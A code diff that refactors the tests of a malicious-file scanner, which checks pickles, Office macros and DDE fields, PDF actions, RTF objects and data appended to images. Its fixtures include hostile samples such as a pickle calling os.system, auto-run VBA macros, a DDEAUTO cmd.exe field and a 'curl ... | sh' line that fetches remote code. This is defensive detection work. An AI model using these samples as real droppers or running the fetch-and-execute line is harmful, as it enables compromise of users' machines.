@@ -55,11 +55,15 @@ def _rules(result) -> dict[str, list]:
 class TestPickles:
     def test_a_reduce_to_os_system_is_named(self) -> None:
         for protocol in (0, 2, 4, 5):
-            report = pickles.read(pickle.dumps(Reduces(os.system, "true"), protocol=protocol))
+            report = pickles.PickleReader.read(
+                pickle.dumps(Reduces(os.system, "true"), protocol=protocol)
+            )
             assert any(i.dangerous and i.name == "system" for i in report.imports), protocol
 
     def test_an_ordinary_model_pickle_is_recognised(self) -> None:
-        report = pickles.read(pickle.dumps(collections.OrderedDict(a=[1, 2]), protocol=4))
+        report = pickles.PickleReader.read(
+            pickle.dumps(collections.OrderedDict(a=[1, 2]), protocol=4)
+        )
         assert report.imports
         assert all(i.recognised and not i.dangerous for i in report.imports)
 
@@ -72,17 +76,17 @@ class TestPickles:
             + b"\x93"
             + b"\x8c\x04true\x85R."
         )
-        [found] = pickles.read(stream).imports
+        [found] = pickles.PickleReader.read(stream).imports
         assert (found.module, found.name) == ("os", "system")
 
     def test_names_fetched_back_from_the_memo_are_followed(self) -> None:
         stream = b"\x80\x04\x8c\x02os\x94\x8c\x06system\x9400h\x00h\x01\x93\x8c\x04true\x85R."
-        [found] = pickles.read(stream).imports
+        [found] = pickles.PickleReader.read(stream).imports
         assert found.dotted == "os.system"
 
     def test_the_import_is_still_found_when_the_file_was_read_in_part(self) -> None:
         whole = pickle.dumps([Reduces(os.system, "true"), list(range(5000))], protocol=4)
-        report = pickles.read(whole[: len(whole) // 2], truncated=True)
+        report = pickles.PickleReader.read(whole[: len(whole) // 2], truncated=True)
         assert report.partial
         assert any(i.dangerous for i in report.imports)
 
@@ -94,22 +98,23 @@ class TestPickles:
             )
             archive.writestr("archive/data/0", b"\x00" * 64)
         raw = buffer.getvalue()
-        assert pickles.looks_like_pickle(raw)
+        assert pickles.PickleReader.looks_like_pickle(raw)
         assert any(
-            i.dangerous and i.member == "archive/data.pkl" for i in pickles.read(raw).imports
+            i.dangerous and i.member == "archive/data.pkl"
+            for i in pickles.PickleReader.read(raw).imports
         )
         # Read in part: no central directory, so the local headers are walked instead.
         cut = raw[: raw.index(b"archive/data/0")]
-        assert any(i.dangerous for i in pickles.read(cut, truncated=True).imports)
+        assert any(i.dangerous for i in pickles.PickleReader.read(cut, truncated=True).imports)
 
     def test_bytes_that_are_not_a_pickle_are_refused(self) -> None:
         with pytest.raises(FormatError):
-            pickles.read(b"\xff\xfe not a pickle")
+            pickles.PickleReader.read(b"\xff\xfe not a pickle")
 
     def test_the_opcode_budget_holds(self, monkeypatch) -> None:
         monkeypatch.setattr(pickles, "MAX_OPCODES", 10)
         with pytest.raises(FormatError, match="opcodes"):
-            pickles.read(pickle.dumps(list(range(100)), protocol=2))
+            pickles.PickleReader.read(pickle.dumps(list(range(100)), protocol=2))
 
 
 class TestPicklesInAScan:
@@ -149,24 +154,24 @@ class TestVbaDecompression:
             "6B6C00306D6E6F700671027004107273747576107778797A003C"
         )
         assert (
-            ole.decompress(compressed)
+            ole.VbaSource.decompress(compressed)
             == b"#aaabcdefaaaaghijaaaaaklaaamnopqaaaaaaaaaaaarstuvwxyzaaa"
         )
 
     def test_a_copy_token_before_its_chunk_is_refused(self) -> None:
         with pytest.raises(FormatError):
-            ole.decompress(b"\x01\x03\xb0\x01\x00\x70")
+            ole.VbaSource.decompress(b"\x01\x03\xb0\x01\x00\x70")
 
     def test_the_output_budget_holds(self, monkeypatch) -> None:
         monkeypatch.setattr(ole, "MAX_SOURCE_BYTES", 100)
         with pytest.raises(FormatError):
-            ole.decompress(ovba_literal(b"A" * 400))
+            ole.VbaSource.decompress(ovba_literal(b"A" * 400))
 
 
 class TestCompoundFiles:
     def test_modules_are_found_and_decompressed(self) -> None:
         source = 'Sub AutoOpen()\r\n  Shell "calc"\r\nEnd Sub\r\n'
-        [module] = ole.vba_modules(ole.CompoundFile(vba_project(source)))
+        [module] = ole.VbaSource.vba_modules(ole.CompoundFile(vba_project(source)))
         assert module.name == "Module1"
         assert "Shell" in module.source
 
@@ -174,14 +179,14 @@ class TestCompoundFiles:
         cache = b"\xcc" * 40
         code = ovba_literal(b'Attribute VB_Name = "M"\r\nSub Document_Open()\r\nEnd Sub\r\n')
         raw = compound({"VBA/dir": b"\x00\x01\x02", "VBA/M": cache + code})
-        [module] = ole.vba_modules(ole.CompoundFile(raw))
+        [module] = ole.VbaSource.vba_modules(ole.CompoundFile(raw))
         assert "Document_Open" in module.source
 
     def test_a_sector_loop_is_refused(self) -> None:
         raw = bytearray(vba_project("Sub X()\r\nEnd Sub\r\n"))
         struct.pack_into("<I", raw, 512 + 4 * 3, 3)  # the module's sector points at itself
         with pytest.raises(FormatError):
-            ole.vba_modules(ole.CompoundFile(bytes(raw)))
+            ole.VbaSource.vba_modules(ole.CompoundFile(bytes(raw)))
 
     def test_a_small_stream_is_read_from_the_ministream(self) -> None:
         raw = bytearray(compound({"Data": b"x" * 64}))
@@ -214,21 +219,21 @@ class TestOfficeDocuments:
                 )
             }
         )
-        kinds = {s.kind for s in documents.read(raw, "report.docm").signals}
+        kinds = {s.kind for s in documents.DocumentReader.read(raw, "report.docm").signals}
         assert {"macro", "auto_exec"} <= kinds
 
     def test_a_macro_that_runs_nothing_by_itself_is_only_a_macro(self) -> None:
         raw = ooxml(
             {"xl/vbaProject.bin": vba_project('Sub Tidy()\r\n  Shell "calc"\r\nEnd Sub\r\n')}
         )
-        kinds = {s.kind for s in documents.read(raw, "book.xlsm").signals}
+        kinds = {s.kind for s in documents.DocumentReader.read(raw, "book.xlsm").signals}
         assert kinds == {"macro"}
 
     def test_an_ole_document_with_macros(self) -> None:
         raw = vba_project(
             'Sub Workbook_Open()\r\n  CreateObject("WScript.Shell")\r\nEnd Sub\r\n', prefix=""
         )
-        kinds = {s.kind for s in documents.read(raw, "legacy.xls").signals}
+        kinds = {s.kind for s in documents.DocumentReader.read(raw, "legacy.xls").signals}
         assert "auto_exec" in kinds
 
     def test_a_remote_template(self) -> None:
@@ -239,7 +244,7 @@ class TestOfficeDocuments:
                 )
             }
         )
-        [signal] = documents.read(raw, "report.docx").signals
+        [signal] = documents.DocumentReader.read(raw, "report.docx").signals
         assert signal.kind == "remote_object"
         assert "https://cdn.example.net" in signal.detail
 
@@ -251,7 +256,9 @@ class TestOfficeDocuments:
                 )
             }
         )
-        assert [s.kind for s in documents.read(raw, "report.docx").signals] == ["remote_object"]
+        assert [s.kind for s in documents.DocumentReader.read(raw, "report.docx").signals] == [
+            "remote_object"
+        ]
 
     def test_hyperlinks_and_internal_relationships_are_ordinary(self) -> None:
         raw = ooxml(
@@ -262,16 +269,18 @@ class TestOfficeDocuments:
                 ),
             }
         )
-        assert documents.read(raw, "report.docx").signals == []
+        assert documents.DocumentReader.read(raw, "report.docx").signals == []
 
     def test_a_dde_field(self) -> None:
         body = '<w:document><w:r><w:instrText xml:space="preserve"> DDEAUTO c:\\\\x\\\\cmd.exe "/k calc"</w:instrText></w:r></w:document>'
         raw = ooxml({"word/document.xml": body})
-        assert [s.kind for s in documents.read(raw, "memo.docx").signals] == ["dde"]
+        assert [s.kind for s in documents.DocumentReader.read(raw, "memo.docx").signals] == ["dde"]
 
     def test_an_excel_4_macro_sheet(self) -> None:
         raw = ooxml({"xl/macrosheets/sheet1.xml": "<xm:macrosheet/>"})
-        assert [s.kind for s in documents.read(raw, "book.xlsm").signals] == ["macro_sheet"]
+        assert [s.kind for s in documents.DocumentReader.read(raw, "book.xlsm").signals] == [
+            "macro_sheet"
+        ]
 
 
 class TestPdf:
@@ -286,7 +295,7 @@ class TestPdf:
             + hidden
             + b"\nendstream endobj\n%%EOF"
         )
-        kinds = {s.kind for s in documents.read(raw, "invoice.pdf").signals}
+        kinds = {s.kind for s in documents.DocumentReader.read(raw, "invoice.pdf").signals}
         assert kinds == {"pdf_auto_action"}
 
     def test_launch_and_an_embedded_executable(self) -> None:
@@ -295,29 +304,33 @@ class TestPdf:
             b"2 0 obj<</Type/Filespec/F(invoice.exe)/EF<</F 3 0 R>>>>endobj\n"
             b"3 0 obj<</Type/EmbeddedFile/Length 2>>stream\nMZ\nendstream endobj\n%%EOF"
         )
-        kinds = {s.kind for s in documents.read(raw, "invoice.pdf").signals}
+        kinds = {s.kind for s in documents.DocumentReader.read(raw, "invoice.pdf").signals}
         assert kinds == {"pdf_launch", "pdf_embedded_executable"}
 
     def test_javascript_without_an_open_action(self) -> None:
         raw = b"%PDF-1.4\n1 0 obj<</S/JavaScript/JS(this.print())>>endobj\n%%EOF"
-        assert [s.kind for s in documents.read(raw, "form.pdf").signals] == ["pdf_javascript"]
+        assert [s.kind for s in documents.DocumentReader.read(raw, "form.pdf").signals] == [
+            "pdf_javascript"
+        ]
 
     def test_a_link_annotation_is_ordinary(self) -> None:
         raw = b"%PDF-1.4\n1 0 obj<</Type/Annot/Subtype/Link/A<</S/URI/URI(https://example.org/)>>>>endobj\n%%EOF"
-        assert documents.read(raw, "manual.pdf").signals == []
+        assert documents.DocumentReader.read(raw, "manual.pdf").signals == []
 
     def test_the_inflation_budget_is_shared_across_streams(self, monkeypatch) -> None:
         monkeypatch.setattr(documents, "MAX_INFLATED_BYTES", 1000)
         body = zlib.compress(b"\x00" * 100_000)
         stream = b"1 0 obj<</Filter/FlateDecode>>stream\n" + body + b"\nendstream endobj\n"
-        report = documents.read(b"%PDF-1.4\n" + stream * 3, "big.pdf")
+        report = documents.DocumentReader.read(b"%PDF-1.4\n" + stream * 3, "big.pdf")
         assert report.partial
 
 
 class TestRtf:
     def test_an_auto_updating_object(self) -> None:
         raw = rb"{\rtf1{\object\objemb\objupdate{\*\objclass Word.Document.8}{\*\objdata 0105}}}"
-        assert [s.kind for s in documents.read(raw, "cv.rtf").signals] == ["rtf_object"]
+        assert [s.kind for s in documents.DocumentReader.read(raw, "cv.rtf").signals] == [
+            "rtf_object"
+        ]
 
     def test_the_equation_editor_class_hex_encoded_in_objdata(self) -> None:
         raw = (
@@ -325,11 +338,11 @@ class TestRtf:
             + b"Equation.3".hex().encode()
             + b"}}}"
         )
-        [signal] = documents.read(raw, "cv.rtf").signals
+        [signal] = documents.DocumentReader.read(raw, "cv.rtf").signals
         assert "equation.3" in signal.detail
 
     def test_plain_rtf_is_ordinary(self) -> None:
-        assert documents.read(rb"{\rtf1\ansi Hello}", "note.rtf").signals == []
+        assert documents.DocumentReader.read(rb"{\rtf1\ansi Hello}", "note.rtf").signals == []
 
 
 class TestDocumentsInAScan:
@@ -357,23 +370,25 @@ class TestDocumentsInAScan:
 class TestImageTrailers:
     @pytest.mark.parametrize("build", [png, jpeg, gif], ids=["png", "jpeg", "gif"])
     def test_a_clean_image_has_no_trailer(self, build) -> None:
-        assert media.trailer(build()) is None
+        assert media.ImageTrailers.trailer(build()) is None
 
     def test_a_jpeg_thumbnail_end_marker_is_not_the_end(self) -> None:
-        assert media.trailer(jpeg(thumbnail=True)) is None
+        assert media.ImageTrailers.trailer(jpeg(thumbnail=True)) is None
 
     @pytest.mark.parametrize("build", [png, jpeg, gif], ids=["png", "jpeg", "gif"])
     def test_an_appended_archive_is_named(self, build) -> None:
-        found = media.trailer(build(b"PK\x03\x04" + b"\x00" * 64))
+        found = media.ImageTrailers.trailer(build(b"PK\x03\x04" + b"\x00" * 64))
         assert found is not None and found.looks_like == "a zip archive"
 
     def test_an_appended_script(self) -> None:
-        found = media.trailer(png(b"#!/bin/sh\ncurl -sSL https://updates.invalid/x | sh\n"))
+        found = media.ImageTrailers.trailer(
+            png(b"#!/bin/sh\ncurl -sSL https://updates.invalid/x | sh\n")
+        )
         assert found is not None and found.looks_like == "a script"
 
     def test_padding_is_not_a_trailer(self) -> None:
-        assert media.trailer(png(b"\x00" * 4096)) is None
-        assert media.trailer(jpeg(b"\n" * 8)) is None
+        assert media.ImageTrailers.trailer(png(b"\x00" * 4096)) is None
+        assert media.ImageTrailers.trailer(jpeg(b"\n" * 8)) is None
 
     def test_unrecognised_trailing_data_is_reported_low(self, tmp_path) -> None:
         found = _rules(_scan(tmp_path, {"photo.png": png(os.urandom(0) + bytes(range(1, 200)))}))
@@ -382,7 +397,7 @@ class TestImageTrailers:
 
     def test_a_png_without_iend_is_unreadable(self) -> None:
         with pytest.raises(FormatError):
-            media.trailer(png()[:-12])
+            media.ImageTrailers.trailer(png()[:-12])
 
 
 class TestRiskyPdfLinks:
@@ -399,11 +414,13 @@ class TestRiskyPdfLinks:
     )
     def test_a_risky_target(self, target) -> None:
         raw = b"%PDF-1.4\n1 0 obj<</S/URI/URI(" + target.encode() + b")>>endobj\n%%EOF"
-        assert [s.kind for s in documents.read(raw, "a.pdf").signals] == ["pdf_risky_uri"]
+        assert [s.kind for s in documents.DocumentReader.read(raw, "a.pdf").signals] == [
+            "pdf_risky_uri"
+        ]
 
     def test_an_ordinary_link_is_not(self) -> None:
         raw = b"%PDF-1.4\n1 0 obj<</S/URI/URI(https://example.org/docs/install.html)>>endobj\n%%EOF"
-        assert documents.read(raw, "a.pdf").signals == []
+        assert documents.DocumentReader.read(raw, "a.pdf").signals == []
 
 
 class TestZipAndOpaqueTrailers:
@@ -415,10 +432,10 @@ class TestZipAndOpaqueTrailers:
         return buffer.getvalue()
 
     def test_a_zip_comment_is_not_a_trailer(self) -> None:
-        assert media.trailer(self._zip()) is None
+        assert media.ImageTrailers.trailer(self._zip()) is None
 
     def test_a_script_after_the_end_record(self) -> None:
-        found = media.trailer(
+        found = media.ImageTrailers.trailer(
             self._zip() + b"#!/bin/sh\ncurl -sSL https://updates.invalid/x | sh\n"
         )
         assert found is not None and found.format == "ZIP" and found.looks_like == "a script"
@@ -427,13 +444,13 @@ class TestZipAndOpaqueTrailers:
         import random
 
         noise = random.Random(7).randbytes(8192)  # noqa: S311 - test data, not a secret
-        found = media.trailer(png(noise))
+        found = media.ImageTrailers.trailer(png(noise))
         assert found is not None and found.opaque
         result = Scanner(Config()).scan(_write(tmp_path, "banner.png", png(noise)))
         assert "SUSPECT.MEDIA.OPAQUE_TRAILER.001" in {f.rule_id for f in result.findings}
 
     def test_metadata_after_the_end_is_not_opaque(self) -> None:
-        found = media.trailer(png(b"Software: an editor\n" * 300))
+        found = media.ImageTrailers.trailer(png(b"Software: an editor\n" * 300))
         assert found is not None and not found.opaque
 
 
